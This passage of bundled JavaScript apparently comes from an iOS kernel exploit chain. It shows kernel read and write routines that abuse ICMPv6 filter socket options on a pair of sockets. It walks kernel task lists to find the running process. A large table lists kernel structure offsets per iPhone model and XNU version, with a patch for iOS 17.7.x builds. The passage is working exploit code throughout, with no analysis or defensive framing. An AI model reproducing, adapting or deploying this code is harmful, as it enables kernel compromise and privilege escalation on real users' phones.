libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(procROAddr);\n\t\t\t//console.log(TAG,`procVal: ${Utils.hex(procVal)}`);\n\t\t\tif (procVal && this.strip(procVal) > 0xffffffd000000000n) {\n\t\t\t\tlet pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procVal + this.#offsets.pid);\n\t\t\t\t//console.log(TAG, `pid:${pid}`);\n\t\t\t\tif (pid == ourPid) {\n\t\t\t\t\tconsole.log(TAG, `Found our pid`);\n\t\t\t\t\treturn nextTask;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (direction)\n\t\t\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.nextTask);\n\t\t\t\telse \n\t\t\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.prevTask);\n\t\t\t}\n\t\t\telse\n\t\t\t\tbreak;\n\t\t}\n\t\treturn false;\n\t}\n\n\t#kreadLength(address, buffer, size) {\n\t\t//console.log(TAG, `kread(${address.toString(16)}, ${size})`);\n\n\t\tlet remaining = BigInt(size);\n\t\tlet read_offset = 0n;\n\t\tlet read_size = 0n;\n\t\n\t\twhile (remaining != 0n) {\n\t\t\tif (remaining >= EARLY_KRW_LENGTH) {\n\t\t\t\tread_size = EARLY_KRW_LENGTH;\n\t\t\t} else {\n\t\t\t\tread_size = remaining % EARLY_KRW_LENGTH;\n\t\t\t}\n\t\t\tif (!this.#kread32Bytes(address + read_offset, buffer + read_offset, read_size))\n\t\t\t\treturn false;\n\t\t\tremaining -= read_size;\n\t\t\tread_offset += read_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\t#kwriteLength(address, buffer, size) {\n\t\t//console.log(TAG, `kwrite(${address.toString(16)}, ${size})`);\n\n\t\tlet remaining = BigInt(size);\n\t\tlet write_offset = 0n;\n\t\tlet write_size = 0n;\n\t\n\t\twhile (remaining != 0n) {\n\t\t\tif (remaining >= EARLY_KRW_LENGTH) {\n\t\t\t\twrite_size = EARLY_KRW_LENGTH;\n\t\t\t} else {\n\t\t\t\twrite_size = remaining % EARLY_KRW_LENGTH;\n\t\t\t}\n\t\n\t\t\tlet kwrite_dst_addr = address + write_offset;\n\t\t\tlet kwrite_src_addr = buffer + write_offset;\n\t\n\t\t\tif (write_size != EARLY_KRW_LENGTH) {\n\t\t\t\tif (!this.#kread32Bytes(kwrite_dst_addr, this.#tmpWriteMem, EARLY_KRW_LENGTH))\n\t\t\t\t\treturn false;\n\t\t\t\tNative.callSymbol(\"memcpy\", this.#tmpWriteMem, kwrite_src_addr, write_size);\n\t\t\t\tkwrite_src_addr = this.#tmpWriteMem;\n\t\t\t}\n\t\n\t\t\tif (!this.#kwrite32Bytes(kwrite_dst_addr, kwrite_src_addr))\n\t\t\t\treturn false;\n\t\t\tremaining -= write_size;\n\t\t\twrite_offset += write_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\t#kread32Bytes(kaddr, buffer, len) {\n\t\tconst tmpBuff = Native.mem + 0x1000n;\n\n\t\t// Set \"kaddr\" address\n\t\tlet buff = new BigUint64Array(4);\n\t\tbuff[0] = kaddr;\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tlet ret = Native.callSymbol(\"setsockopt\", this.#controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuff, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt: \" + ret);\n\t\t\treturn false;\n\t\t}\n\n\t\tbuff[0] = BigInt(len);\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tret = Native.callSymbol(\"getsockopt\", this.#rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buffer, tmpBuff);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"getsockopt failed reading \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kaddr));\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n\t#kwrite32Bytes(kaddr, buffer) {\n\t\tconst tmpBuff = Native.mem + 0x1000n;\n\n\t\t// Set \"kaddr\" address\n\t\tlet buff = new BigUint64Array(4);\n\t\tbuff[0] = kaddr;\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tlet ret = Native.callSymbol(\"setsockopt\", this.#controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuff, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt: \" + ret);\n\t\t\treturn false;\n\t\t}\n\n\t\tret = Native.callSymbol(\"setsockopt\", this.#rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buffer, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt failed writing \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kaddr));\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Driver/Offsets.js\":\n/*!************************************!*\\\n  !*** ./src/libs/Driver/Offsets.js ***!\n  \\************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Offsets)\n/* harmony export */ });\n/* harmony import */ var libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/OffsetsStruct */ \"./src/libs/Chain/OffsetsStruct.js\");\n/* harmony import */ var _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./OffsetsTable */ \"./src/libs/Driver/OffsetsTable.js\");\n\n\n\nconst TAG  = \"OFFSETS\"\n\nclass Offsets\n{\n\tstatic getByDeviceAndVersion()\n\t{\n\t\tNative.callSymbol(\"uname\", Native.mem);\n\t\tconst sysname = Native.readString(Native.mem, 0x100);\n\t\tconst nodename = Native.readString(Native.mem + 0x100n, 0x100);\n\t\tconst release = Native.readString(Native.mem + 0x200n, 0x100);\n\t\tconst version = Native.readString(Native.mem + 0x300n, 0x100);\n\t\tconst machine = Native.readString(Native.mem + 0x400n, 0x100);\n\t\tconsole.log(TAG, `release: ${release} with machine: ${machine}`);\n\n\t\tconst buildVer = this.getBuildVersion();\n\t\tconsole.log(TAG, \"Build version: \" + buildVer);\n\n\t\tlet splittedVersion = release.split(\".\");\n\t\tlet xnuMajor = splittedVersion[0];\n\t\tlet xnuMinor = splittedVersion[1];\n\n\t\tlet splittedMachine = machine.split(\",\");\n\t\tlet deviceFamily = splittedMachine[0];\n\t\tlet deviceModel = splittedMachine[1];\n\n\t\tconsole.log(TAG, \"deviceFamily: \" + deviceFamily);\n\n\t\t// Ugly hack to support 17.7, 17.7.1 and 17.7.2\n\t\tif (buildVer) {\n\t\t\tif (buildVer == \"21H16\")\n\t\t\t\txnuMinor = 6.1;\n\t\t\telse if (buildVer == \"21H216\")\n\t\t\t\txnuMinor = 6.2;\n\t\t\telse if (buildVer == \"21H221\")\n\t\t\t\txnuMinor = 6.3;\n\t\t}\n\t\t// Get offsets per device family\n\t\tlet deviceOffsets = _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__.offsets[deviceFamily];\n\t\tif (!deviceOffsets) {\n\t\t\tconsole.log(TAG, `Unsupported machine: ${machine}`);\n\t\t\treturn null;\n\t\t}\n\n\t\tlet familyOffsets = deviceOffsets[\"*\"];\n\t\tlet foundFamilyOffsets = this.#getOffsetsByVersion(familyOffsets, xnuMajor, xnuMinor);\n\n\t\tif (!foundFamilyOffsets)\n\t\t\treturn null;\n\n\t\t// Adjustments per device model\n\t\tlet modelOffsets = deviceOffsets[deviceModel];\n\t\tlet foundModelOffsets = null;\n\t\tif (modelOffsets)\n\t\t\tfoundModelOffsets = this.#getOffsetsByVersion(modelOffsets, xnuMajor, xnuMinor);\n\n\t\t// Merge family offsets and device offsets\n\t\tlet foundOffsets = new libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"]();\n\t\tObject.assign(foundOffsets, foundFamilyOffsets);\n\t\tif (foundModelOffsets)\n\t\t\tObject.assign(foundOffsets, foundModelOffsets);\n\n\t\tif ([\"iPhone15\", \"iPhone16\", \"iPhone17\"].includes(deviceFamily))\n\t\t\tfoundOffsets.T1SZ_BOOT = 17n;\n\t\telse\n\t\t\tfoundOffsets.T1SZ_BOOT = 25n;\n\n\t\tconsole.log(TAG, \"Offsets: \" + JSON.stringify(foundOffsets, (_,v) => typeof v === 'bigint' ? \"0x\"+v.toString(16) : v, 2));\n\n\t\treturn foundOffsets;\n\t}\n\n\tstatic #getOffsetsByVersion(offsets, xnuMajor, xnuMinor) {\n\t\tlet xnuMajorOffsets = 0;\n\t\tfor (let major in offsets) {\n\t\t\tif (xnuMajor < major)\n\t\t\t\tcontinue;\n\t\t\tif (xnuMajorOffsets < major)\n\t\t\t\txnuMajorOffsets = major;\n\t\t}\n\n\t\tif (!xnuMajorOffsets) {\n\t\t\tconsole.log(TAG, \"Unsupported XNU major: \" + xnuMajor);\n\t\t\treturn null;\n\t\t}\n\n\t\t//console.log(TAG, \"Matching XNU major: \" + xnuMajorOffsets);\n\t\txnuMajorOffsets = offsets[xnuMajorOffsets];\n\n\t\tlet foundOffsets = {};\n\t\tlet xnuMinorOffsets = -1;\n\t\tconst sortedMinors = Object.keys(xnuMajorOffsets).sort();\n\t\tfor (let minor of sortedMinors) {\n\t\t\t//console.log(TAG, `minor: ${minor}, xnuMinor: ${xnuMinor}`);\n\t\t\tif (minor > xnuMinor)\n\t\t\t\tbreak;\n\t\t\tif (xnuMinorOffsets < minor) {\n\t\t\t\txnuMinorOffsets = minor;\n\t\t\t\tObject.assign(foundOffsets, xnuMajorOffsets[minor]);\n\t\t\t}\n\t\t}\n\n\t\t//console.log(TAG, \"Matching XNU minor: \" + xnuMinorOffsets);\n\n\t\treturn foundOffsets;\n\t}\n\tstatic getBuildVersion() {\n\t\tconst CTL_KERN = 1;\n\t\tconst KERN_OSVERSION = 65;\n\n\t\tconst mib = new ArrayBuffer(4 * 2);\n\t\tconst mibView = new DataView(mib);\n\t\tmibView.setInt32(0, CTL_KERN, true);\n\t\tmibView.setInt32(4, KERN_OSVERSION, true);\n\n\t\tconst mibAddr = Native.mem;\n\t\tconst resultAddr = Native.mem + 0x100n;\n\t\tconst lengthAddr = Native.mem + 0x200n;\n\n\t\tNative.write(Native.mem, mib);\n\n\t\tlet ret = Native.callSymbol(\"sysctl\", mibAddr, 2, resultAddr, lengthAddr, null, 0);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"Unable to get iOS build version\");\n\t\t\treturn null;\n\t\t}\n\n\t\tconst length = Native.read32(lengthAddr);\n\t\tconst buildVer = Native.readString(resultAddr, length);\n\t\treturn buildVer;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Driver/OffsetsTable.js\":\n/*!*****************************************!*\\\n  !*** ./src/libs/Driver/OffsetsTable.js ***!\n  \\*****************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   offsets: () => (/* binding */ offsets)\n/* harmony export */ });\nconst offsets = {\n\t// iPhone XS\n\t// iPhone XS Max\n\t// iPhone XS Max Global\n\t// iPhone XR\n\t\"iPhone11\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xe8n,\n\t\t\t\t\tropPid: 0x150n,\n\t\t\t\t\tjopPid: 0x158n,\n\t\t\t\t\tguardExcCode: 0x308n,\n\t\t\t\t\ttaskThreads: 0x348n,\n\t\t\t\t\ttro: 0x358n,\n\t\t\t\t\tast: 0x37cn,\n\t\t\t\t\tmutexData: 0x380n,\n\t\t\t\t\tctid: 0x408n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x918210n,\n\t\t\t\t\tguardExcCode: 0x318n,\n\t\t\t\t\ttaskThreads: 0x358n,\n\t\t\t\t\ttro: 0x368n,\n\t\t\t\t\tast: 0x38cn,\n\t\t\t\t\tmutexData: 0x398n,\n\t\t\t\t\tctid: 0x418n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x91c638n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x320n,\n\t\t\t\t\ttaskThreads: 0x360n,\n\t\t\t\t\ttro: 0x370n,\n\t\t\t\t\tast: 0x394n,\n\t\t\t\t\tmutexData: 0x3a0n,\n\t\t\t\t\tctid: 0x420n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x920a90n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9209f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x920a40n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f1548n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x320n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f1560n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x370n,\n\t\t\t\t\tast: 0x394n,\n\t\t\t\t\tmutexData: 0x3a0n,\n\t\t\t\t\tctid: 0x420n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fd988n,\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f5988n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa62b50n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6ac38n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6ad48n,\n  \t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x378n,\n  \t\t\t\t\ttro: 0x380n,\n  \t\t\t\t\tast: 0x3a4n,\n  \t\t\t\t\tmutexData: 0x3b0n,\n  \t\t\t\t\tctid: 0x430n,\n  \t\t\t\t\tmigLock: 0x36971f0n,\n  \t\t\t\t\tmigSbxMsg: 0x3697210n,\n  \t\t\t\t\tmigKernelStackLR: 0x2f7c1a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x8fc638n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x900a90n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9009f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x900a40n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9d1548n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9d1560n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9d9988n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9d1988n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa42b50n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n,\n\t\t\t\t\tmigLock: 0x38d74e8n,\n\t\t\t\t\tmigSbxMsg: 0x38d7508n,\n\t\t\t\t\tmigKernelStackLR: 0x31b19e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa4ad48n,\n\t\t\t\t\tmigLock: 0x352e1f0n,\n\t\t\t\t\tmigSbxMsg: 0x352e210n,\n\t\t\t\t\tmigKernelStackLR: 0x2e5ba20n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 11\n\t// iPhone 11 Pro\n\t// iPhone 11 Pro Max\n\t// iPhone SE 2\n\t\"iPhone12\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x96c178n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x970588n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9749d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa494a0n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa518c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa498c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n  \t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n  \t\t\t\t\ttro: 0x390n,\n  \t\t\t\t\tast: 0x3b4n,\n  \t\t\t\t\tmutexData: 0x3c0n,\n  \t\t\t\t\tctid: 0x440n,\n\t\t\t\t\tmigLock: 0x38e34e8n,\n\t\t\t\t\tmigSbxMsg: 0x38e3508n,\n\t\t\t\t\tmigKernelStackLR: 0x31ba7a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"3\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x974588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9789d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa4d4a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa558c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa4d8c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n\t\t\t\t\tmigLock: 0x38e7468n,\n\t\t\t\t\tmigSbxMsg: 0x38e7488n,\n\t\t\t\t\tmigKernelStackLR: 0x31bf5a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x974588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9789d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa4d4a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa558c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa4d8c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n\t\t\t\t\tmigLock: 0x38e7468n,\n\t\t\t\t\tmigSbxMsg: 0x38e7488n,\n\t\t\t\t\tmigKernelStackLR: 0x31bf5a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x960588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9649d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x964938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x964988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa35488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa354a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3d8c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa358c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xab6a90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xabeb78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xac2c88n,\n\t\t\t\t\tmigLock: 0x387a8e8n,\n\t\t\t\t\tmigSbxMsg: 0x387a908n,\n\t\t\t\t\tmigKernelStackLR: 0x3156f20n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 12\n\t// iPhone 12 Mini\n\t// iPhone 12 Pro\n\t// iPhone 12 Pro Max\n\t\"iPhone13\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x318n,\n\t\t\t\t\ttaskThreads: 0x358n,\n\t\t\t\t\ttro: 0x368n,\n\t\t\t\t\tast: 0x38cn,\n\t\t\t\t\tmutexData: 0x390n,\n\t\t\t\t\tctid: 0x418n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x94c2d0n,\n\t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x9546e0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x954b30n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x954a90n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x954ae0n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa295e0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2d5f8n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa35a20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa2da20n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa9ebe8n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n,\n\t\t\t\t\tmigLock: 0x37b8b80n,\n\t\t\t\t\tmigSbxMsg: 0x37b8ba0n,\n\t\t\t\t\tmigKernelStackLR: 0x3190fa0n\n\t\t\t\t},\n\t\t\t\t5: 